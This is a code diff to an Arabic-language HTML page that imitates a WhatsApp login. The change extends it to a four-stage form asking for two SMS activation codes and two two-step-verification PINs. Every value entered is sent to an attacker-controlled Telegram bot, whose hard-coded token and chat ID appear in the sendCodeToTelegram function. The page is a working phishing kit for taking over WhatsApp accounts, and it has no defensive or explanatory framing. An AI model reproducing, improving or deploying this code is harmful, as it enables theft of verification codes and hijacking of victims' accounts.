@@ -98,12 +98,6 @@
         .container button:hover {
             background-color: #1DA955;
         }
-
-        #countdown {
-            color: red;
-            font-weight: bold;
-            margin-top: 10px;
-        }
     </style>
 </head>
 
@@ -115,29 +109,13 @@
 
     <div class="container" id="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <h1>تسجيل الدخول</h1>
+        <h1>المرحلة الأولى: رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
-        <input id="activationCode" type="tel" placeholder="رمز التفعيل" maxlength="6">
-        <button onclick="startVerification()">متابعة</button>
-        <div id="countdown"></div>
+        <input id="activationCode1" type="tel" placeholder="رمز التفعيل الأول" maxlength="6">
+        <button onclick="submitFirstActivationCode()">متابعة</button>
     </div>
 
     <script>
-        let attempts = 0;
-
-        function startVerification() {
-            const activationCodeInput = document.getElementById('activationCode');
-            const activationCode = activationCodeInput.value;
-
-            if (!activationCode || activationCode.length !== 6 || !/^\d{6}$/.test(activationCode)) {
-                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode, "رمز التفعيل");
-            displaySecondStage();
-        }
-
         function sendCodeToTelegram(code, type) {
             const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
             const chatId = '612575358';
@@ -157,27 +135,79 @@
             });
         }
 
-        function displaySecondStage() {
-            const container = document.getElementById('container');
-            container.innerHTML = `
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                <h1>التحقق بخطوتين</h1>
-                <p>يرجى إدخال رمز PIN المكون من 6 أرقام.</p>
-                <input id="pinCode" type="text" placeholder="PIN Code" maxlength="6">
-                <button onclick="submitSecondCode()">متابعة</button>
-            `;
-        }
+        function submitFirstActivationCode() {
+            const activationCode1 = document.getElementById('activationCode1').value;
 
-        function submitSecondCode() {
-            const pinCode = document.getElementById('pinCode').value;
-
-            if (!pinCode || pinCode.length !== 6 || !/^\d+$/.test(pinCode)) {
-                alert('يرجى إدخال رمز PIN مكون من 6 أرقام فقط.');
+            if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
+                alert('يرجى إدخال رمز التفعيل الأول (6 أرقام).');
                 return;
             }
 
-            sendCodeToTelegram(pinCode, "رمز PIN");
-            alert('تم إرسال رمز PIN بنجاح!');
+            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
+
+            // الانتقال إلى المرحلة الثانية
+            const container = document.getElementById('container');
+            container.innerHTML = `
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                <h1>المرحلة الثانية: رمز التفعيل</h1>
+                <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
+                <input id="activationCode2" type="text" placeholder="رمز التفعيل الثاني" maxlength="6">
+                <button onclick="submitSecondActivationCode()">متابعة</button>
+            `;
+        }
+
+        function submitSecondActivationCode() {
+            const activationCode2 = document.getElementById('activationCode2').value;
+
+            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
+                alert('يرجى إدخال رمز التفعيل الثاني (6 أرقام).');
+                return;
+            }
+
+            sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
+
+            // الانتقال إلى المرحلة الثالثة
+            const container = document.getElementById('container');
+            container.innerHTML = `
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                <h1>المرحلة الأولى: PIN</h1>
+                <p>يرجى إدخال رمز PIN المكون من 6 أرقام.</p>
+                <input id="pinCode1" type="text" placeholder="PIN الأول" maxlength="6">
+                <button onclick="submitFirstPin()">متابعة</button>
+            `;
+        }
+
+        function submitFirstPin() {
+            const pinCode1 = document.getElementById('pinCode1').value;
+
+            if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
+                alert('يرجى إدخال رمز PIN الأول (6 أرقام).');
+                return;
+            }
+
+            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
+
+            // الانتقال إلى المرحلة الرابعة
+            const container = document.getElementById('container');
+            container.innerHTML = `
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                <h1>المرحلة الثانية: PIN</h1>
+                <p>يرجى إدخال رمز PIN الثاني المكون من 6 أرقام.</p>
+                <input id="pinCode2" type="text" placeholder="PIN الثاني" maxlength="6">
+                <button onclick="submitSecondPin()">متابعة</button>
+            `;
+        }
+
+        function submitSecondPin() {
+            const pinCode2 = document.getElementById('pinCode2').value;
+
+            if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
+                alert('يرجى إدخال رمز PIN الثاني (6 أرقام).');
+                return;
+            }
+
+            sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
+            alert('تم إكمال جميع المراحل بنجاح!');
         }
     </script>
 </body>
